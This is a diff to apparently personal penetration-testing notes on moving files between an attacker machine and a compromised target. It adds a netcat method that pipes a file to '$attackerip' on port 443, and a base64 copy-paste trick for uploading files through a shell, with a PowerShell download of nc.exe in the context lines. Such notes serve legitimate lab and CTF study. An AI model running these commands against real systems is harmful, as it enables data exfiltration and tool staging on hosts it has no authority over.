@@ -1,5 +1,5 @@
-### Transfering Files from your Attack Box to the Target
-#### Netcat File Transfer
+# Transfering Files 
+## Netcat File Transfer
 - Step 1
 - Create a file on the target box in the /tmp directory
 ```
@@ -13,8 +13,16 @@ nc -nlvp 1234 > file.txt
 ```
 nc [target box ip] 1234 < file-to-be-transfered.txt
 ```
-
-#### Python HTTP Server File Transfer
+#### Method Two
+- On attacker run:
+````
+nc -lvp 443> transfer.txt
+````
+- On target run:
+````
+cat transfer.txt | nc $attackerip 443
+````
+## Python HTTP Server File Transfer
 - Start the Python Server in the directory where the file is located that you want to transfer
 - Use the ip address assigned to your box, if there is a vpn involved use the vpn address
 
@@ -133,8 +141,17 @@ powershell Invoke-WebRequest -Uri http://[ip attack box]/nc.exe -OutFile C:\nc.e
 ````
 powershell $PSVersionTable.PsVersion
 ````
-
-
+## I am Stuck
+- If u ever happen to have a shell of a UNIX system, and cannot find a way to upload anything, this is a lifesaver trick you can try:
+- On local system:
+````
+cat filetoupload | base64 -w 0; echo
+````
+- Double click on output to copy
+- On Target System:
+````
+echo <copiedContent> | base64 -d > filetoupload
+````
 
 
 
